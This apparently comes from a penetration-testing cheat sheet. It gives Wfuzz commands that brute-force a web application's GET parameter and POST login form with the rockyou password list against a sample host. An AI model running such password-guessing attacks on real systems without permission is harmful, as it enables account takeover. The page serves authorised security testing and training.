---
title: Wfuzz
desc: Brute force HTTP GET, POST request in web application.  It can also handle JSON response by the Content-Length in HTTP response.
tags: [BruteForce, Password, Web]
alts: [Hydra]
website:
render_with_liquid: false
---

## GET Request

```sh
# Query parameter
wfuzz -z,file /usr/share/wordlists/rockyou.txt http://10.0.0.1/?q=FUZZ
```

<br />

## POST Request

```sh
# --hc: Hide status code
# --hh: Hide chars (Content-Length)
wfuzz -z,file /usr/share/wordlists/rockyou.txt -d "username=FUZZ&password=FUZZ" --hc 302 http://10.0.0.1/login
```